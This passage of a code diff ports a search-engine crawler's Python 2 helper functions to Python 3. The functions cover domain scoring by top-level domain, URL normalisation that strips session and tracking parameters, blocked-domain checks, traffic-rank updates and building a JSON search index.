             rulematches.append('-6 points for root domain .info/.cn/.ru/.su./.biz/.mobi/.icu')
     # Differing scores for language-centric top-level domains.
-    elif item.rooturl.endswith(u'.casa'):
+    elif item.rooturl.endswith('.casa'):
         if lang == 'es':
             value -= 1
             if verbose:
@@ -1215,23 +1213,23 @@ def CalculateTermValue(item, keywords, abbreviated=False, lang=None, verbose=Fal
             if verbose:
                 rulematches.append('-3 points for .casa and not language es.')
     # Lose moderate points for some new TLDs and CCTLDs.
-    elif item.rooturl.endswith(u'.club') or item.rooturl.endswith(u'.guru') or item.rooturl.endswith(u'.ninja') or item.rooturl.endswith(u'.kr') or item.rooturl.endswith(u'.jp') or item.rooturl.endswith(u'.az') or item.rooturl.endswith(u'.iq') or item.rooturl.endswith(u'.ir') or item.rooturl.endswith(u'.name') or item.rooturl.endswith(u'.pro') or item.rooturl.endswith(u'.gratis') or item.rooturl.endswith(u'.win') or item.rooturl.endswith(u'.ooo') or item.rooturl.endswith(u'.plus') or item.rooturl.endswith(u'blue') or item.rooturl.endswith(u'party') or item.rooturl.endswith(u'.vip'):
+    elif item.rooturl.endswith('.club') or item.rooturl.endswith('.guru') or item.rooturl.endswith('.ninja') or item.rooturl.endswith('.kr') or item.rooturl.endswith('.jp') or item.rooturl.endswith('.az') or item.rooturl.endswith('.iq') or item.rooturl.endswith('.ir') or item.rooturl.endswith('.name') or item.rooturl.endswith('.pro') or item.rooturl.endswith('.gratis') or item.rooturl.endswith('.win') or item.rooturl.endswith('.ooo') or item.rooturl.endswith('.plus') or item.rooturl.endswith('blue') or item.rooturl.endswith('party') or item.rooturl.endswith('.vip'):
         value -= 4
         if verbose:
             rulematches.append('-4 points for domain .club/.guru/.ninja/.kr/.jp./.az/.iq/.ir/.name/.pro/.gratis/.win/.ooo/.plus/.party/.blue/.vip')
-    elif item.rooturl.endswith(u'.in') or item.rooturl.endswith(u'.sg') or item.rooturl.endswith(u'.tw') or item.rooturl.endswith(u'.ng') or item.rooturl.endswith(u'.my') or item.rooturl.endswith(u'.id') or item.rooturl.endswith(u'.ph') or item.rooturl.endswith(u'.lk') or item.rooturl.endswith(u'.ae') or item.rooturl.endswith(u'.ws') or item.rooturl.endswith(u'.om') or item.rooturl.endswith(u'.kw') or item.rooturl.endswith(u'.th') or item.rooturl.endswith(u'.bn') or item.rooturl.endswith(u'.am') or item.rooturl.endswith(u'.ge') or item.rooturl.endswith(u'.mn') or item.rooturl.endswith(u'.jo') or item.rooturl.endswith(u'.by') or item.rooturl.endswith(u'.la') or item.rooturl.endswith(u'.bt') or item.rooturl.endswith(u'.ae') or item.rooturl.endswith(u'.win') or item.rooturl.endswith(u'.site') or item.rooturl.endswith(u'.cafe') or item.rooturl.endswith(u'.download') or item.rooturl.endswith(u'.live') or item.rooturl.endswith(u'.today'):
+    elif item.rooturl.endswith('.in') or item.rooturl.endswith('.sg') or item.rooturl.endswith('.tw') or item.rooturl.endswith('.ng') or item.rooturl.endswith('.my') or item.rooturl.endswith('.id') or item.rooturl.endswith('.ph') or item.rooturl.endswith('.lk') or item.rooturl.endswith('.ae') or item.rooturl.endswith('.ws') or item.rooturl.endswith('.om') or item.rooturl.endswith('.kw') or item.rooturl.endswith('.th') or item.rooturl.endswith('.bn') or item.rooturl.endswith('.am') or item.rooturl.endswith('.ge') or item.rooturl.endswith('.mn') or item.rooturl.endswith('.jo') or item.rooturl.endswith('.by') or item.rooturl.endswith('.la') or item.rooturl.endswith('.bt') or item.rooturl.endswith('.ae') or item.rooturl.endswith('.win') or item.rooturl.endswith('.site') or item.rooturl.endswith('.cafe') or item.rooturl.endswith('.download') or item.rooturl.endswith('.live') or item.rooturl.endswith('.today'):
         value -= 2
         if verbose:
             rulematches.append('-2 points for domain .in/.sg/.tw/.mobi/.biz/.ng/.my/.id/.ph/.tw/.sg/.in/.lk/.ae/.ws/.om/.kw/.th/.bn/.am/.ge/.mn/.jo/.by/.la/.bt/.ae/.site/.cafe/.download/.live/.today')
-    elif item.rooturl.endswith(u'.tv') or item.rooturl.endswith(u'.vi') or item.rooturl.endswith(u'.vg') or item.rooturl.endswith(u'.sc') or item.rooturl.endswith(u'.vu') or item.rooturl.endswith(u'.to') or item.rooturl.endswith(u'.tl') or item.rooturl.endswith(u'.nr') or item.rooturl.endswith(u'.sh') or item.rooturl.endswith(u'.pn') or item.rooturl.endswith(u'.tk') or item.rooturl.endswith(u'.tc') or item.rooturl.endswith(u'.us'):
+    elif item.rooturl.endswith('.tv') or item.rooturl.endswith('.vi') or item.rooturl.endswith('.vg') or item.rooturl.endswith('.sc') or item.rooturl.endswith('.vu') or item.rooturl.endswith('.to') or item.rooturl.endswith('.tl') or item.rooturl.endswith('.nr') or item.rooturl.endswith('.sh') or item.rooturl.endswith('.pn') or item.rooturl.endswith('.tk') or item.rooturl.endswith('.tc') or item.rooturl.endswith('.us'):
         value -= 1
         if verbose:
             rulematches.append('-1 points for domain .tv/.vi/.vg/.sc/.vu/.to/.tl/.nr/.sh/.pn/.tk/.tc/.us')
-    elif item.rooturl.endswith(u'.net') or item.rooturl.endswith(u'.org') or item.rooturl.endswith(u'.ca') or item.rooturl.endswith(u'.mil') or item.rooturl.endswith(u'.au') or item.rooturl.endswith(u'.uk'):
+    elif item.rooturl.endswith('.net') or item.rooturl.endswith('.org') or item.rooturl.endswith('.ca') or item.rooturl.endswith('.mil') or item.rooturl.endswith('.au') or item.rooturl.endswith('.uk'):
         value += 1
         if verbose:
             rulematches.append('1 point for domain .net/.org/.ca/.mil/.au/.uk.')
-    elif item.rooturl.endswith(u'.com') or item.rooturl.endswith(u'.edu') or item.rooturl.endswith(u'.gov'):
+    elif item.rooturl.endswith('.com') or item.rooturl.endswith('.edu') or item.rooturl.endswith('.gov'):
         value += 3
         if verbose:
             rulematches.append('3 points for domain .com/.edu/.gov.')
@@ -1444,13 +1442,13 @@ def CalculateTermValue(item, keywords, abbreviated=False, lang=None, verbose=Fal
             if verbose:
                 rulematches.append('{0} points for {1} keywords in page text.'.format(-20, '21+'))
         # Parked domains. Certain text is considered a "park" and those domains get demoted.
-        if (item.pagetext.startswith('Buy this domain.') or (u'This website is for sale' in item.pagetitle) or (u'This website is for sale' in item.pagetext) or 
-          (u'The Sponsored Listings displayed above are served automatically by a third party.' in item.pagetext) or (u' is for sale' in item.pagetext)):
+        if (item.pagetext.startswith('Buy this domain.') or ('This website is for sale' in item.pagetitle) or ('This website is for sale' in item.pagetext) or
+          ('The Sponsored Listings displayed above are served automatically by a third party.' in item.pagetext) or (' is for sale' in item.pagetext)):
             if verbose:
                 rulematches.append('Lose half of points for parked domain.')
             value /= 2
         # These phrases mean that a site is possibly parked, but almost definitely garbage.
-        if (u'Resources and Information.' in item.pagetitle) or (u'For search results please CLICK HERE' in item.pagetext):
+        if ('Resources and Information.' in item.pagetitle) or ('For search results please CLICK HERE' in item.pagetext):
             value -= 8
     # Empty pages without much real content, are penalized severely.
     if not item.pagetext or (len(item.pagetext) < 3):
@@ -1546,7 +1544,7 @@ def CopySiteData(site, newsite):
     newsite.content_type_header = site.content_type_header
     newsite.num_iframes = site.num_iframes
     newsite.num_javascripts = site.num_javascripts
-    newsite.num_images = site.num_images 
+    newsite.num_images = site.num_images
     newsite.num_css_files = site.num_css_files
     newsite.num_video_tags = site.num_video_tags
     newsite.num_audio_tags = site.num_audio_tags
@@ -1570,23 +1568,23 @@ def MoveSiteTo(site, language, whole_domain=True, tag_as_subdir=False, verbose=F
         # Set ranked keywords for that domain to reindex.
         existing_model = type(site)
         if verbose:
-            print u'MoveSiteTo: Existing model is: {0}'.format(existing_model.__name__)
+            print('MoveSiteTo: Existing model is: {0}'.format(existing_model.__name__))
         # Handle SiteInfo, SiteInfoAfterZ, SiteInfoBeforeZero
-        if existing_model.__name__ == 'SiteInfo' or not '_' in existing_model.__name__:
+        if existing_model.__name__ == 'SiteInfo' or '_' not in existing_model.__name__:
             existlang = 'en'
         else:
             existlang = existing_model.__name__[-2:]
         ranking_model = GetKeywordRankingModelFromLanguage(existlang)
         if verbose:
-            print u'MoveSiteTo: Ranking model is: {0}'.format(ranking_model)
+            print('MoveSiteTo: Ranking model is: {0}'.format(ranking_model))
         keywords = ranking_model.objects.filter(rooturl=site.rooturl)
         for keyword in keywords:
             if verbose:
                 try:
-                    print u"MoveSiteTo: Keywords '{0}' added to {1} pending index.".format(keyword.keywords, existlang)
+                    print("MoveSiteTo: Keywords '{0}' added to {1} pending index.".format(keyword.keywords, existlang))
                 except:
-                    print u"MoveSiteTo: Keywords added to {0} pending index.".format(existlang)
-            AddPendingTerm(keyword.keywords, existlang, u'Site {0} moved to {1} and it ranks {2} for {3}'.format(site, language, keyword.rank, keyword.keywords))
+                    print("MoveSiteTo: Keywords added to {0} pending index.".format(existlang))
+            AddPendingTerm(keyword.keywords, existlang, 'Site {0} moved to {1} and it ranks {2} for {3}'.format(site, language, keyword.rank, keyword.keywords))
         # Set the domain's language. If we're moving a URL parameter or langid page, this is a noop.
         SetDomainLanguage(site.rooturl, language)
     elif tag_as_subdir:
@@ -1623,7 +1621,7 @@ def RemoveURLsForDomain(rooturl):
                 # like Armenian, that doesn't have a language table.
                 pass
     except ObjectDoesNotExist:
-         pass
+        pass
     # Now we nuke all crawlable URLs.
     CrawlableUrl.objects.filter(rooturl=rooturl).delete()
 
@@ -1640,22 +1638,22 @@ def IsHtmlUrl(url):
     # domains but not .cab files by parsing the URL and checking against the file portion
     # and not the domain portion rather than just blindly checking the end of the whole URL.
     badextensions = [
-                     u'.asm', u'.bat', u'.css', u'.csv', u'.dmg', u'.eps', u'.f4v', u'.git',
-                     u'.exe', u'.msi', u'.pdf', u'.xpi', u'.xap', u'.bz2', u'.tar', u'.tgz',
-                     u'.mp3', u'.mp4', u'.mkv', u'.jpg', u'.jpeg', u'.gif', u'.png', u'.bmp',
-                     u'.gz', u'.zip', u'.webm', u'.rar', u'.rpm', u'.deb', u'.wmv', u'.xml',
-                     u'.svg', u'.tif', u'.json', u'.m4a', u'.xsd', u'.3gp', u'.mov', u'.m3u',
-                     u'.hqx', u'.ico', u'.pps', u'.ppt', u'.psd', u'.ram', u'.rss', u'.rst',
-                     u'.ogg', u'.wav', u'.rm', u'.flv', u'.swf', u'.mpg', u'.mpeg', u'.apk',
-                     u'.vcf', u'.md5', u'.jar', '.ttf', u'.otf', u'.dll', u'.iso', u'.rtf',
-                     u'.bin', u'.xls', u'.xlsx', u'.doc', u'.docx', u'.dat', u'.avi', u'.pptx',
-                     u'.sln', u'.yml', u'.hpp', u'.h2drumkit', u'.m4v', u'.cab', u'.xz',
-                     u'.ogv', u'.pup', u'.epub', u'.wma', u'.tiff', u'.owl', u'.ppsx'
+                     '.asm', '.bat', '.css', '.csv', '.dmg', '.eps', '.f4v', '.git',
+                     '.exe', '.msi', '.pdf', '.xpi', '.xap', '.bz2', '.tar', '.tgz',
+                     '.mp3', '.mp4', '.mkv', '.jpg', '.jpeg', '.gif', '.png', '.bmp',
+                     '.gz', '.zip', '.webm', '.rar', '.rpm', '.deb', '.wmv', '.xml',
+                     '.svg', '.tif', '.json', '.m4a', '.xsd', '.3gp', '.mov', '.m3u',
+                     '.hqx', '.ico', '.pps', '.ppt', '.psd', '.ram', '.rss', '.rst',
+                     '.ogg', '.wav', '.rm', '.flv', '.swf', '.mpg', '.mpeg', '.apk',
+                     '.vcf', '.md5', '.jar', '.ttf', '.otf', '.dll', '.iso', '.rtf',
+                     '.bin', '.xls', '.xlsx', '.doc', '.docx', '.dat', '.avi', '.pptx',
+                     '.sln', '.yml', '.hpp', '.h2drumkit', '.m4v', '.cab', '.xz',
+                     '.ogv', '.pup', '.epub', '.wma', '.tiff', '.owl', '.ppsx'
                     ]
     for extension in badextensions:
         if url.endswith(extension):
             return False
-    if u'javascript:' in url or u'mailto:' in url or 'tel:' in url:
+    if 'javascript:' in url or 'mailto:' in url or 'tel:' in url:
         return False
     if url == '.' or url == '..' or url == './' or url == '../' or url == '~' or url == ':':
         return False
@@ -1668,7 +1666,7 @@ def IsHtmlExtension(url):
     We're not counting .py (python) and .pl (perl) as definitely HTML extensions because
     they're the TLDs for Paraguay and Poland.
     """
-    extensions = [u'.htm', u'.html', u'.php', u'.asp', u'.aspx', u'.jsp', u'.cfm']
+    extensions = ['.htm', '.html', '.php', '.asp', '.aspx', '.jsp', '.cfm']
     for extension in extensions:
         if url.endswith(extension):
             return True
@@ -1676,13 +1674,13 @@ def IsHtmlExtension(url):
 
 def IsDomainBlocked(checkdomain, verbose=False):
     if verbose:
-        print u'Checking domain for exclusion: ' + checkdomain
+        print('Checking domain for exclusion: ' + checkdomain)
     if checkdomain.endswith('/'):
         checkdomain = checkdomain[0:-1]
     try:
         blocked_domain = BlockedSite.objects.get(url=checkdomain)
         if verbose:
-            print checkdomain + u' is a blocked domain.'
+            print(checkdomain + ' is a blocked domain.')
         return True
     except ObjectDoesNotExist:
         pass
@@ -1692,12 +1690,12 @@ def IsDomainBlocked(checkdomain, verbose=False):
             blocked_domain = BlockedSite.objects.get(url=root_domain)
             if blocked_domain.exclude_subdomains:
                 if verbose:
-                    print root_domain + u' is a blocked domain with all subdomains blocked.'
+                    print(root_domain + ' is a blocked domain with all subdomains blocked.')
                 return True
     except ObjectDoesNotExist:
         pass
     if verbose:
-        print u'Domain is OK.'
+        print('Domain is OK.')
     return False
 
 def DomainLimitReached(checkdomain, verbose=False):
@@ -1706,14 +1704,14 @@ def DomainLimitReached(checkdomain, verbose=False):
         if not domain.max_urls:
             return False
         if verbose:
-            print u'Domain max urls: {0}, Language: {1}'.format(domain.max_urls, domain.language_association)
+            print('Domain max urls: {0}, Language: {1}'.format(domain.max_urls, domain.language_association))
         if domain.language_association:
             site_model = GetSiteInfoModelFromLanguage(domain.language_association)
         else:
             site_model = GetSiteInfoModelFromLanguage('en')
         total = site_model.objects.filter(rooturl=checkdomain).count()
         if verbose:
-            print u'Number of domain urls: {0}'.format(total)
+            print('Number of domain urls: {0}'.format(total))
         if domain.max_urls and (total >= domain.max_urls):
             return True
     except ObjectDoesNotExist:
@@ -1730,70 +1728,70 @@ def NormalizeUrl(url, pre_crawl_replacement=False, post_crawl_replacement=False,
         else:
             url = 'http:' + url
     # Remove Tomcat session IDs if there are idiots who have managed to set up stupid URLs.
-    url = re.sub(';jsessionid=.*?(?=\\?|$)','', url)
-    url = re.sub('jsessionid=.*?(?=\\?|$)','', url)
-    parsedurl = urlparse.urlparse(url)
+    url = re.sub(';jsessionid=.*?(?=\\?|$)', '', url)
+    url = re.sub('jsessionid=.*?(?=\\?|$)', '', url)
+    parsedurl = urllib.parse.urlparse(url)
     if parsedurl.query:
-        queryparams = dict(urlparse.parse_qsl(parsedurl.query))
-        if queryparams.has_key('PHPSESSID'):
+        queryparams = dict(urllib.parse.parse_qsl(parsedurl.query))
+        if 'PHPSESSID' in queryparams:
             del queryparams['PHPSESSID']
-        if queryparams.has_key('fbclid'):
+        if 'fbclid' in queryparams:
             del queryparams['fbclid']
-        if queryparams.has_key('sid'):
+        if 'sid' in queryparams:
             del queryparams['sid']
-        if queryparams.has_key('SID'):
+        if 'SID' in queryparams:
             del queryparams['SID']
-        if queryparams.has_key('___SID'):
+        if '___SID' in queryparams:
             del queryparams['___SID']
-        if queryparams.has_key('ID'):
+        if 'ID' in queryparams:
             del queryparams['ID']
-        if queryparams.has_key('jsessionid'):
+        if 'jsessionid' in queryparams:
             del queryparams['jsessionid']
-        if queryparams.has_key('sessionid'):
+        if 'sessionid' in queryparams:
             del queryparams['sessionid']
-        if queryparams.has_key('force_sid'):
+        if 'force_sid' in queryparams:
             del queryparams['force_sid']
-        if queryparams.has_key('zenid'):
+        if 'zenid' in queryparams:
             del queryparams['zenid']
-        if queryparams.has_key('sessid'):
+        if 'sessid' in queryparams:
             del queryparams['sessid']
-        if queryparams.has_key('sess'):
+        if 'sess' in queryparams:
             del queryparams['sess']
-        if queryparams.has_key('ses'):
+        if 'ses' in queryparams:
             del queryparams['ses']
-        if queryparams.has_key('Sess'):
+        if 'Sess' in queryparams:
             del queryparams['Sess']
-        if queryparams.has_key('SESSION'):
+        if 'SESSION' in queryparams:
             del queryparams['SESSION']
-        if queryparams.has_key('token'):
+        if 'token' in queryparams:
             del queryparams['token']
-        if queryparams.has_key('responseToken'):
+        if 'responseToken' in queryparams:
             del queryparams['responseToken']
-        if queryparams.has_key('osCsid'):
+        if 'osCsid' in queryparams:
             del queryparams['osCsid']
-        if queryparams.has_key('eSID'):
+        if 'eSID' in queryparams:
             del queryparams['eSID']
-        if queryparams.has_key('XTCsid'):
+        if 'XTCsid' in queryparams:
             del queryparams['XTCsid']
-        if queryparams.has_key('MODsid'):
+        if 'MODsid' in queryparams:
             del queryparams['MODsid']
-        if queryparams.has_key('session_id'):
+        if 'session_id' in queryparams:
             del queryparams['session_id']
-        if queryparams.has_key('Session_ID'):
+        if 'Session_ID' in queryparams:
             del queryparams['Session_ID']
-        if queryparams.has_key('ASPSESSIONID'):
+        if 'ASPSESSIONID' in queryparams:
             del queryparams['ASPSESSIONID']
-        if queryparams.has_key('utm_source'):
+        if 'utm_source' in queryparams:
             del queryparams['utm_source']
-        if queryparams.has_key('utm_medium'):
+        if 'utm_medium' in queryparams:
             del queryparams['utm_medium']
-        if queryparams.has_key('utm_campaign'):
+        if 'utm_campaign' in queryparams:
             del queryparams['utm_campaign']
-        if queryparams.has_key('utm_term'):
+        if 'utm_term' in queryparams:
             del queryparams['utm_term']
-        if queryparams.has_key('utm_content'):
+        if 'utm_content' in queryparams:
             del queryparams['utm_content']
-        if queryparams.has_key('s'):
+        if 's' in queryparams:
             param = queryparams['s']
             if len(param) == 32:
                 del queryparams['s']
@@ -1802,20 +1800,20 @@ def NormalizeUrl(url, pre_crawl_replacement=False, post_crawl_replacement=False,
             numparams = params.count()
             if numparams > 0:
                 for param in params:
-                    if pre_crawl_replacement and param.remove_before_crawl and queryparams.has_key(param.parameter):
+                    if pre_crawl_replacement and param.remove_before_crawl and param.parameter in queryparams:
                         del queryparams[param.parameter]
                     elif pre_crawl_replacement and param.replace_before_crawl:
                         queryparams[param.parameter] = param.replace_with
                     elif post_crawl_replacement and param.remove_or_replace_after_crawl:
-                        #print u'Deleting {0} from URL'.format(param.parameter)
-                        if queryparams.has_key(param.parameter) and not param.replace_with:
+                        # print u'Deleting {0} from URL'.format(param.parameter)
+                        if param.parameter in queryparams and not param.replace_with:
                             del queryparams[param.parameter]
                         elif param.replace_with:
                             queryparams[param.parameter] = param.replace_with
         if len(queryparams) > 0:
-            #try:
-            newurl = parsedurl.scheme + '://' + parsedurl.netloc.lower() + parsedurl.path + parsedurl.params + '?' + urllib.urlencode(queryparams)
-            #except ValueError:
+            # try:
+            newurl = parsedurl.scheme + '://' + parsedurl.netloc.lower() + parsedurl.path + parsedurl.params + '?' + urllib.parse.urlencode(queryparams)
+            # except ValueError:
             #    print u'ValueError encoding query params, using URL without query.'
             #    newurl = parsedurl.scheme + '://' + parsedurl.netloc.lower() + parsedurl.path + parsedurl.params
             #    print u'Was: {0}, Now: {1}'.format(url, newurl)
@@ -1835,7 +1833,7 @@ def CanCrawlUrl(url, verbose=False):
     if not CanReCrawlUrl(url, verbose):
         return False
     if verbose:
-        print u'Testing CanCrawlURL for: ' + url
+        print('Testing CanCrawlURL for: ' + url)
     # Check 'no new urls' setting for domain extension.
     rooturl = GetRootUrl(url)
     # We only count domain limit on crawl, not recrawl.
@@ -1848,28 +1846,28 @@ def CanCrawlUrl(url, verbose=False):
 def CanReCrawlUrl(url, verbose=False):
     if verbose:
         try:
-            print u'Testing CanReCrawlURL for: ' + url
+            print('Testing CanReCrawlURL for: ' + url)
         except:
-            print u'URL is unprintable. Weird.'
+            print('URL is unprintable. Weird.')
     if not IsHtmlUrl(url):
         if verbose:
-            print u'This is not an HTML URL.'
+            print('This is not an HTML URL.')
         return False
     rooturl = GetRootUrl(url)
     if IsDomainBlocked(rooturl, verbose):
         if verbose:
-            print u'This domain is blocked'
+            print('This domain is blocked')
         return False
     # Check "only root domain" crawl
     try:
         di = DomainInfo.objects.get(url=rooturl)
         if di.only_crawl_rooturl:
             if verbose:
-                print u'This domain has only crawl root url set.'
-            if url != rooturl and url != (rooturl + u'/') and url != (u'http://' + rooturl) and url != (u'https://' + rooturl) and url != (u'http://' + rooturl + u'/') and url != (u'https://' + rooturl + u'/'):
-               if verbose:
-                   print u'Cannot crawl url because this domain has only crawl root url set and this is not the root url.'
-               return False
+                print('This domain has only crawl root url set.')
+            if url != rooturl and url != (rooturl + '/') and url != ('http://' + rooturl) and url != ('https://' + rooturl) and url != ('http://' + rooturl + '/') and url != ('https://' + rooturl + '/'):
+                if verbose:
+                    print('Cannot crawl url because this domain has only crawl root url set and this is not the root url.')
+                return False
     except:
         pass
     return True
@@ -1889,7 +1887,7 @@ def UpdateAlexaRank(domain_name, rank):
         # Consider both to be the same thing and make them match.
         try:
             if not domain.url.startswith('www.'):
-                domain = DomainInfo.objects.get(url='www.'+ domain_name)
+                domain = DomainInfo.objects.get(url='www.' + domain_name)
                 domain.alexa_rank = rank
                 domain.alexa_rank_date = datetime.date.today()
                 domain.alexa_outdated = False
@@ -1915,7 +1913,7 @@ def UpdateAlexaRank(domain_name, rank):
             # Update the www. version or non-www. version of the domain if it exists.
             try:
                 if not domain.url.startswith('www.'):
-                    domain = DomainInfo.objects.get(url='www.'+ domain_name)
+                    domain = DomainInfo.objects.get(url='www.' + domain_name)
                     domain.alexa_rank = rank
                     domain.alexa_rank_date = datetime.date.today()
                     domain.alexa_outdated = False
@@ -1932,7 +1930,7 @@ def UpdateAlexaRank(domain_name, rank):
             # to-be-crawled list so it eventually makes it into the index.
             # But only if it's not blocked.
             try:
-                blocked_domain = BlockedSite.objects.get(url=domain_name)
+                BlockedSite.objects.get(url=domain_name)
             except ObjectDoesNotExist:
                 # Exception on a get means that it wasn't found in the block list.
                 url = CrawlableUrl()
@@ -1962,7 +1960,7 @@ def UpdateQuantcastRank(domain_name, rank):
         # Consider both to be the same thing and make them match.
         try:
             if not domain.url.startswith('www.'):
-                domain = DomainInfo.objects.get(url='www.'+ domain_name)
+                domain = DomainInfo.objects.get(url='www.' + domain_name)
                 domain.quantcast_rank = rank
                 domain.quantcast_rank_date = datetime.date.today()
                 domain.quantcast_outdated = False
@@ -1988,7 +1986,7 @@ def UpdateQuantcastRank(domain_name, rank):
             # Update the www. version or non-www. version of the domain if it exists.
             try:
                 if not domain.url.startswith('www.'):
-                    domain = DomainInfo.objects.get(url='www.'+ domain_name)
+                    domain = DomainInfo.objects.get(url='www.' + domain_name)
                     domain.quantcast_rank = rank
                     domain.quantcast_rank_date = datetime.date.today()
                     domain.quantcast_outdated = False
@@ -2005,7 +2003,7 @@ def UpdateQuantcastRank(domain_name, rank):
             # to-be-crawled list so it eventually makes it into the index.
             # But only if it's not blocked.
             try:
-                blocked_domain = BlockedSite.objects.get(url=domain_name)
+                BlockedSite.objects.get(url=domain_name)
             except ObjectDoesNotExist:
                 # Exception on a get means that it wasn't found in the block list.
                 url = CrawlableUrl()
@@ -2036,7 +2034,7 @@ def UpdateDomcopRank(domain_name, rank, pagerank):
         # Consider both to be the same thing and make them match.
         try:
             if not domain.url.startswith('www.'):
-                domain = DomainInfo.objects.get(url='www.'+ domain_name)
+                domain = DomainInfo.objects.get(url='www.' + domain_name)
                 domain.domcop_rank = rank
                 domain.domcop_pagerank = pagerank
                 domain.domcop_rank_date = datetime.date.today()
@@ -2065,7 +2063,7 @@ def UpdateDomcopRank(domain_name, rank, pagerank):
             # Update the www. version or non-www. version of the domain if it exists.
             try:
                 if not domain.url.startswith('www.'):
-                    domain = DomainInfo.objects.get(url='www.'+ domain_name)
+                    domain = DomainInfo.objects.get(url='www.' + domain_name)
                     domain.domcop_rank = rank
                     domain.domcop_pagerank = pagerank
                     domain.domcop_rank_date = datetime.date.today()
@@ -2084,7 +2082,7 @@ def UpdateDomcopRank(domain_name, rank, pagerank):
             # to-be-crawled list so it eventually makes it into the index.
             # But only if it's not blocked.
             try:
-                blocked_domain = BlockedSite.objects.get(url=domain_name)
+                BlockedSite.objects.get(url=domain_name)
             except ObjectDoesNotExist:
                 # Exception on a get means that it wasn't found in the block list.
                 url = CrawlableUrl()
@@ -2104,9 +2102,9 @@ def MarkURLContentsAsSpam(html, ip=None):
     domains = []
     for link in soup.find_all('a'):
         hr = link.get('href')
-        #print 'Found URL: ' + hr
+        # print 'Found URL: ' + hr
         rooturl = GetRootUrl(hr)
-        #print 'Tag domain as spam: ' + rooturl
+        # print 'Tag domain as spam: ' + rooturl
         if rooturl not in domains:
             domains.append(rooturl)
     for dom in domains:
@@ -2194,15 +2192,15 @@ def BuildJsonIndex(language='en', limit=None, only_empty=True, sleep=0):
     for term in terms:
         x = x + 1
         if limit and x > limit:
-            print 'Reached limit of ' + str(limit) + ', exiting.'
+            print('Reached limit of ' + str(limit) + ', exiting.')
             return
-        print 'Importing term ' + str(x) + ' of ' + str(term_count) + ': ' + term.keywords
+        print('Importing term ' + str(x) + ' of ' + str(term_count) + ': ' + term.keywords)
         JsonifyIndexTerm(term, language)
         size = len(term.search_results)
         cumulative = cumulative + size
         if sleep:
             time.sleep(sleep)
-        print 'Search results size: ' + str(size) + ', Total Size: ' + str(cumulative)
+        print('Search results size: ' + str(size) + ', Total Size: ' + str(cumulative))
 
 # Requires an IndexTerm, will JSONify and save its search rankings.
 def JsonifyIndexTerm(term, language='en', save=True, limit=200, verbose=False):
@@ -2225,46 +2223,46 @@ def JsonifyIndexTerm(term, language='en', save=True, limit=200, verbose=False):
             title = ''
             if item.pagetitle:
                 title = item.pagetitle[0:120]
-            if search_result.has_key(item.rooturl):
-                search_result[item.rooturl]['urls'].append({ 'url': item.url, 'id': item.id, 'score': record[1], 'title': item.pagetitle, 'description': description })
+            if item.rooturl in search_result:
+                search_result[item.rooturl]['urls'].append({'url': item.url, 'id': item.id, 'score': record[1], 'title': item.pagetitle, 'description': description})
             # If the item has "www." but we have a non-www of the domain in the search results.
-            elif item.rooturl.startswith('www.') and search_result.has_key(item.rooturl[4:]):
+            elif item.rooturl.startswith('www.') and item.rooturl[4:] in search_result:
                 if verbose:
                     print('JsonifyIndexTerm: WWW site {0} has non-WWW version in results.'.format(item.rooturl))
-                search_result[item.rooturl[4:]]['urls'].append({ 'url': item.url, 'id': item.id, 'score': record[1], 'title': item.pagetitle, 'description': description })
+                search_result[item.rooturl[4:]]['urls'].append({'url': item.url, 'id': item.id, 'score': record[1], 'title': item.pagetitle, 'description': description})
                 search_result[item.rooturl[4:]]['alternateurl'] = item.rooturl
                 # This is unnecessary because the URLs come to us sorted highest to lowest score, so the first one
                 # in already has the highest score.
-                #topurl = search_result[item.rooturl[4:]]['urls'][0]['url']
-                #highest = urlparse.urlparse(topurl).netloc
-                #if highest != item.rooturl[4:]:
+                # topurl = search_result[item.rooturl[4:]]['urls'][0]['url']
+                # highest = urlparse.urlparse(topurl).netloc
+                # if highest != item.rooturl[4:]:
                 #    print u'WWW is most prominently shown and highest scoring item is {0}. We will switch these'.format(highest)
                 #    search_result[highest] = search_result.pop(item.rooturl[4:])
             # If the item does not have "www." but we have a "www." version of the domain in the search results.
-            elif not item.rooturl.startswith('www.') and search_result.has_key('www.' + item.rooturl):
+            elif not item.rooturl.startswith('www.') and 'www.' + item.rooturl in search_result:
                 if verbose:
                     print('JsonifyIndexTerm: non-WWW site {0} has WWW version in results.'.format(item.rooturl))
-                search_result['www.' + item.rooturl]['urls'].append({ 'url': item.url, 'id': item.id, 'score': record[1], 'title': item.pagetitle, 'description': description })
+                search_result['www.' + item.rooturl]['urls'].append({'url': item.url, 'id': item.id, 'score': record[1], 'title': item.pagetitle, 'description': description})
                 search_result['www.' + item.rooturl]['alternateurl'] = item.rooturl
                 # This is unnecessary because the URLs come to us sorted highest to lowest score, so the first one
                 # in already has the highest score.
-                #topurl = search_result['www.' + item.rooturl]['urls'][0]['url']
-                #highest = urlparse.urlparse(topurl).netloc
-                #if highest != ('www.' + item.rooturl):
+                # topurl = search_result['www.' + item.rooturl]['urls'][0]['url']
+                # highest = urlparse.urlparse(topurl).netloc
+                # if highest != ('www.' + item.rooturl):
                 #    print u'non-WWW is most prominently shown and highest scoring item is {0}. We will switch these'.format(highest)
                 #    search_result[highest] = search_result.pop('www.' + item.rooturl)
             else:
-                search_result[item.rooturl] = { 'score': record[1], 'urls': [{ 'url': item.url, 'id': item.id, 'score': record[1], 'title': title, 'description': description },] }
+                search_result[item.rooturl] = {'score': record[1], 'urls': [{'url': item.url, 'id': item.id, 'score': record[1], 'title': title, 'description': description}, ]}
         except ObjectDoesNotExist:
             pass
-    for key, value in search_result.iteritems():
+    for key, value in search_result.items():
         # Need to sort by highest order first before truncating.
         search_result[key]['urls'] = sorted(value['urls'], key=lambda item: item['score'], reverse=True)[0:50]
         # Extra points for more than one URL for that keyword.
         num_urls = len(search_result[key]['urls'])
         search_result[key]['score'] = value['urls'][0]['score'] + GetUrlCountScore(num_urls)
     # Need to sort first, then truncate results.
-    search_results = sorted(search_result.iteritems(), key=lambda item: item[1]['score'], reverse=True)[0:limit]
+    search_results = sorted(iter(search_result.items()), key=lambda item: item[1]['score'], reverse=True)[0:limit]
     term.num_results = len(search_results)
     if verbose:
         print('JsonifyIndexTerm: Term has {0} search results after jsonify.'.format(term.num_results))
@@ -2279,7 +2277,7 @@ def JsonifyIndexTerm(term, language='en', save=True, limit=200, verbose=False):
     if term.refused:
         show = False
     for result in search_results:
-        #print u'{0} ranks {1} for {2}'.format(result[0], rank, term)
+        # print u'{0} ranks {1} for {2}'.format(result[0], rank, term)
         rankitem = ranking_model()
         rankitem.rooturl = result[0]
         rankitem.keywords = term
